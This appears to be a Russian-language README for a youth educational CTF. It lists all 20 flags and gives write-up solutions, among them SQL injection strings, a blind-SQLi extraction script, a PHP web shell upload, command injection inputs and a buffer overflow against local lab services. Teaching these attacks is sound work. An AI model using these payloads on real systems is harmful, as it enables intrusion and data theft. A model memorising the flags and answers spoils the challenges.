
# 🏴‍☠️ TatarHack CTF 2026

<div align="center">

![CTF](https://img.shields.io/badge/CTF-Educational-blue)
![Challenges](https://img.shields.io/badge/Challenges-20-green)
![Docker](https://img.shields.io/badge/Docker-Ready-blue)
![License](https://img.shields.io/badge/License-MIT-yellow)

**Образовательный CTF для детей и подростков (10-16 лет)**

[Быстрый старт](#-быстрый-старт) •
[Задания](#-список-заданий) •
[Write-ups](#-write-ups) •
[Развёртывание](#-развёртывание)

</div>

---

## 📖 О проекте

Набор из 20 CTF-заданий для обучения основам кибербезопасности. Все задания безопасны, образовательны и подходят для начинающих.

### Категории
| Категория | Описание | Кол-во |
|-----------|----------|--------|
| 🌐 **Web** | SQL Injection, File Upload, Command Injection | 5 |
| 🔧 **Reverse** | Анализ бинарных файлов | 5 |
| 🔐 **Crypto** | Шифры и кодировки | 5 |
| 💥 **Pwn** | Переполнение буфера | 1 |
| 🎯 **Misc** | Разное | 4 |

### Формат флага
```
TATARHACK{...}
```

---

## 🚀 Быстрый старт

### Требования
- Docker & Docker Compose
- GCC (для reverse/pwn заданий)
- Python 3.x

### Запуск

```bash
# Клонировать репозиторий
git clone https://github.com/your-username/tatarhack-ctf.git
cd tatarhack-ctf

# Запустить все web-сервисы
docker compose up -d

# Проверить статус
docker ps
```

### Доступные сервисы

| Порт | Задание | Категория | Сложность |
|------|---------|-----------|-----------|
| 5001 | SQL Injection Easy | Web | Easy |
| 5002 | Hidden Page | Web | Easy |
| 5003 | SQL Blind | Web | Medium |
| 5004 | File Upload | Web | Medium |
| 5005 | Command Injection | Web | Hard |
| 5006 | Robots.txt | Misc | Easy |
| 5019 | Buffer Overflow | Pwn | Hard |

---

## 📋 Список заданий

### Easy (100 очков) — 8 заданий

| # | Название | Категория | Флаг |
|---|----------|-----------|------|
| 1 | Baby SQL | Web | `TATARHACK{sql_1nj3ct10n_1s_d4ng3r0us}` |
| 2 | Секретная страница | Web | `TATARHACK{h1dd3n_p4g3s_4r3_n0t_s3cur3}` |
| 3 | Простой пароль | Reverse | `TATARHACK{str1ngs_4r3_v1s1bl3}` |
| 4 | Математика | Reverse | `TATARHACK{m4th_1s_3asy}` |
| 5 | Шифр Цезаря | Crypto | `TATARHACK{c43s4r_w4s_h3r3}` |
| 6 | Странные символы | Crypto | `TATARHACK{b4s364_1s_n0t_3ncrypt10n}` |
| 7 | Роботы | Misc | `TATARHACK{r0b0ts_txt_1s_publ1c}` |
| 8 | Метаданные | Misc | `TATARHACK{m3t4d4t4_1s_3v3rywh3r3}` |

### Medium (200 очков) — 7 заданий

| # | Название | Категория | Флаг |
|---|----------|-----------|------|
| 9 | Слепой SQL | Web | `TATARHACK{bl1nd_sql_1s_sl0w_but_w0rks}` |
| 10 | Загрузчик файлов | Web | `TATARHACK{f1l3_upl04d_1s_d4ng3r0us}` |
| 11 | XOR Проверка | Reverse | `TATARHACK{x0r_r3v3rs3}` |
| 12 | Посимвольная проверка | Reverse | `TATARHACK{l00p_ch3ck}` |
| 13 | XOR Шифр | Crypto | `TATARHACK{x0r_1s_r3v3rs1bl3}` |
| 14 | Подстановка | Crypto | `TATARHACK{subst1tut10n_c1ph3r}` |
| 15 | Анализ логов | Misc | `TATARHACK{l0g_4n4lys1s_sk1lls}` |

### Hard (300 очков) — 5 заданий

| # | Название | Категория | Флаг |
|---|----------|-----------|------|
| 16 | Пинг-понг | Web | `TATARHACK{c0mm4nd_1nj3ct10n_1s_cr1t1c4l}` |
| 17 | Запутанный код | Reverse | `TATARHACK{0bfusc4t3d}` |
| 18 | Двойная защита | Crypto | `TATARHACK{d0ubl3_3nc0d1ng}` |
| 19 | Переполнение буфера | Pwn | `TATARHACK{buff3r_0v3rfl0w_b4s1cs}` |
| 20 | Пазл | Misc | `TATARHACK{p1ec3s_t0g3th3r}` |

---

## 🔓 Write-ups

<details>
<summary><b>🌐 Web Challenges (5 заданий)</b></summary>

### 1. Baby SQL (Easy) — 100 pts

**Флаг:** `TATARHACK{sql_1nj3ct10n_1s_d4ng3r0us}`

**Описание:** Форма входа с SQL-инъекцией.

**Решение:**
```
Логин: ' OR 1=1 --
Пароль: любой
```

SQL-запрос становится:
```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'
```

**Урок:** Никогда не вставляй пользовательский ввод напрямую в SQL!

---

### 2. Секретная страница (Easy) — 100 pts

**Флаг:** `TATARHACK{h1dd3n_p4g3s_4r3_n0t_s3cur3}`

**Решение:**
```bash
curl http://localhost:5002/secret
```

**Урок:** Скрытые URL без авторизации — не защита!

---

### 9. Слепой SQL (Medium) — 200 pts

**Флаг:** `TATARHACK{bl1nd_sql_1s_sl0w_but_w0rks}`

**Решение:**
```
Ввод: ' UNION SELECT flag FROM secrets--
```

Или автоматизированный скрипт:
```python
import requests

url = "http://localhost:5003/check"
flag = ""

for i in range(1, 50):
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
        payload = f"' OR (SELECT SUBSTR(flag,{i},1) FROM secrets)='{c}'--"
        r = requests.post(url, data={"username": payload})
        if "существует" in r.text:
            flag += c
            print(flag)
            break
    if flag.endswith("}"):
        break
```

---

### 10. Загрузчик файлов (Medium) — 200 pts

**Флаг:** `TATARHACK{f1l3_upl04d_1s_d4ng3r0us}`

**Решение:**

1. Создать `shell.php`:
```php
<?php system('cat /flag.txt'); ?>
```

2. Загрузить через форму
3. Открыть `http://localhost:5004/uploads/shell.php`

---

### 16. Пинг-понг (Hard) — 300 pts

**Флаг:** `TATARHACK{c0mm4nd_1nj3ct10n_1s_cr1t1c4l}`

**Решение:**
```
Ввод: 127.0.0.1; cat /flag.txt
```

Альтернативы: `$(cat /flag.txt)` или `127.0.0.1 && cat /flag.txt`

</details>

<details>
<summary><b>🔧 Reverse Challenges (5 заданий)</b></summary>

### 3. Простой пароль (Easy) — 100 pts

**Флаг:** `TATARHACK{str1ngs_4r3_v1s1bl3}`  
**Пароль:** `secretpass123`

**Решение:**
```bash
strings password_check | grep -i secret
# или
ltrace ./password_check
```

---

### 4. Математика (Easy) — 100 pts

**Флаг:** `TATARHACK{m4th_1s_3asy}`  
**Ответ:** `42`

**Решение:** В декомпиляторе видно условие `x * 2 + 10 == 94`

```
x = (94 - 10) / 2 = 42
```

---

### 11. XOR Проверка (Medium) — 200 pts

**Флаг:** `TATARHACK{x0r_r3v3rs3}`

**Решение:**
```python
encrypted = [0x16, 0x03, 0x16, 0x03, 0x30, 0x2a, 0x03, 0x21, 
             0x29, 0x39, 0x3a, 0x72, 0x30, 0x74, 0x30, 0x77, 
             0x33, 0x31, 0x77, 0x3d, 0x7d]
key = 0x42

flag = ''.join(chr(b ^ key) for b in encrypted)
print(flag)
```

---

### 12. Посимвольная проверка (Medium) — 200 pts

**Флаг:** `TATARHACK{l00p_ch3ck}`

**Решение:** Анализ цикла в Ghidra — каждый символ сравнивается с константой.

---

### 17. Запутанный код (Hard) — 300 pts

**Флаг:** `TATARHACK{0bfusc4t3d}`  
**Пароль:** `hidden_key`

**Решение:** Найти функцию `real_check()` среди мусорного кода.

</details>

<details>
<summary><b>🔐 Crypto Challenges (5 заданий)</b></summary>

### 5. Шифр Цезаря (Easy) — 100 pts

**Флаг:** `TATARHACK{c43s4r_w4s_h3r3}`

**Шифротекст:** `WDWDUKDFN{f43v4u_z4v_k3u3}`  
**Сдвиг:** 3

**Решение:**
```python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

print(caesar_decrypt("WDWDUKDFN{f43v4u_z4v_k3u3}", 3))
```

---

### 6. Странные символы (Easy) — 100 pts

**Флаг:** `TATARHACK{b4s364_1s_n0t_3ncrypt10n}`

**Данные:** `VEFUQVJIQUNLe2I0czM2NF8xc19uMHRfM25jcnlwdDEwbn0=`

**Решение:**
```bash
echo "VEFUQVJIQUNLe2I0czM2NF8xc19uMHRfM25jcnlwdDEwbn0=" | base64 -d
```

---

### 13. XOR Шифр (Medium) — 200 pts

**Флаг:** `TATARHACK{x0r_1s_r3v3rs1bl3}`

**Данные:** `1f0016000c0a1c050a0c160f350e02760f32700135083b193b04`  
**Ключ:** `KEY`

**Решение (known-plaintext attack):**
```python
cipher = bytes.fromhex("1f0016000c0a1c050a0c160f350e02760f32700135083b193b04")
key = "KEY"
flag = ''.join(chr(b ^ ord(key[i % 3])) for i, b in enumerate(cipher))
print(flag)
```

---

### 14. Подстановка (Medium) — 200 pts

**Флаг:** `TATARHACK{subst1tut10n_c1ph3r}`

**Шифротекст:** `ZCZCKXZFP{WQJWZ1ZQZ10G_F1SX3K}`

**Решение:** Используя частичную таблицу восстанавливаем полную подстановку.

---

### 18. Двойная защита (Hard) — 300 pts

**Флаг:** `TATARHACK{d0ubl3_3nc0d1ng}`

**Данные:** `Gx4AHAYQFgEIAhAWHxU4EwA5EzY5ETc7EzI=`  
**Ключ:** `SEC`

**Решение:** Base64 decode → XOR decrypt
```python
import base64

data = "Gx4AHAYQFgEIAhAWHxU4EwA5EzY5ETc7EzI="
key = "SEC"

decoded = base64.b64decode(data)
flag = ''.join(chr(b ^ ord(key[i % 3])) for i, b in enumerate(decoded))
print(flag)
```

</details>

<details>
<summary><b>💥 Pwn Challenges (1 задание)</b></summary>

### 19. Переполнение буфера (Hard) — 300 pts

**Флаг:** `TATARHACK{buff3r_0v3rfl0w_b4s1cs}`

**Описание:** Буфер 32 байта, за ним переменная `is_admin`.

**Решение:**
```bash
python3 -c "print('A' * 40)" | nc localhost 5019
```

Или с pwntools:
```python
from pwn import *

p = remote('localhost', 5019)
p.sendline(b'A' * 36)
print(p.recvall().decode())
```

</details>

<details>
<summary><b>🎯 Misc Challenges (4 задания)</b></summary>

### 7. Роботы (Easy) — 100 pts

**Флаг:** `TATARHACK{r0b0ts_txt_1s_publ1c}`

**Решение:**
1. Открыть `http://localhost:5006/robots.txt`
2. Найти `Disallow: /super_secret_flag_page`
3. Перейти на `/super_secret_flag_page`

---

### 8. Метаданные (Easy) — 100 pts

**Флаг:** `TATARHACK{m3t4d4t4_1s_3v3rywh3r3}`

**Решение:**
```bash
exiftool secret_image.jpg | grep -i copyright
```

---

### 15. Анализ логов (Medium) — 200 pts

**Флаг:** `TATARHACK{l0g_4n4lys1s_sk1lls}`

**Решение:**
```bash
grep "TATARHACK" server.log
```

---

### 20. Пазл (Hard) — 300 pts

**Флаг:** `TATARHACK{p1ec3s_t0g3th3r}`

**Решение:**
1. Прочитать `hint.txt` — порядок: 3, 1, 4, 2
2. Собрать части:
```bash
cat part3.txt part1.txt part4.txt part2.txt
# TATAR + HACK{ + p1ec3s_ + t0g3th3r}
```

</details>

---

## 🛠 Развёртывание

### Локально (Docker)

```bash
docker compose up -d
```

### На сервере (Debian/Ubuntu)

```bash
# Установить Docker
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER

# Запустить
cd ctf
docker compose up -d
```

### Интеграция с CTFd

```bash
cd ctfd-export
python3 import_challenges.py http://ctfd-server:8000 API_TOKEN SERVER_IP
```

Подробнее: [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)

---

## 📁 Структура проекта

```
ctf/
├── docker-compose.yml
├── web/
│   ├── 01-sql-injection-easy/
│   ├── 02-hidden-page/
│   ├── 09-sql-blind/
│   ├── 10-file-upload/
│   └── 16-command-injection/
├── reverse/
│   ├── 03-password-check/
│   ├── 04-math-check/
│   ├── 11-xor-check/
│   ├── 12-loop-validation/
│   └── 17-obfuscated/
├── crypto/
│   ├── 05-caesar/
│   ├── 06-base64/
│   ├── 13-xor-cipher/
│   ├── 14-substitution/
│   └── 18-double-encoding/
├── pwn/
│   └── 19-buffer-overflow/
├── misc/
│   ├── 07-robots/
│   ├── 08-metadata/
│   ├── 15-log-analysis/
│   └── 20-puzzle/
└── ctfd-export/
    ├── challenges.json
    └── import_challenges.py
```

---

## 🔧 Рекомендуемые инструменты

| Категория | Инструменты |
|-----------|-------------|
| **Web** | Браузер DevTools, Burp Suite, curl |
| **Reverse** | Ghidra, IDA Free, strings, ltrace |
| **Crypto** | CyberChef, Python |
| **Pwn** | GDB, pwntools, checksec |
| **Misc** | exiftool, grep, base64 |

---

## ⚠️ Важно

> Все задания предназначены **ТОЛЬКО** для образовательных целей!
> - Не используйте полученные знания во вред
> - Атакуйте только разрешённые системы
> - CTF — это обучение, а не взлом!

---

## 📜 Лицензия

MIT License — свободное использование в образовательных целях

---

<div align="center">
<i>Создано с ❤️ для TatarHack CTF 2026</i>
</div>
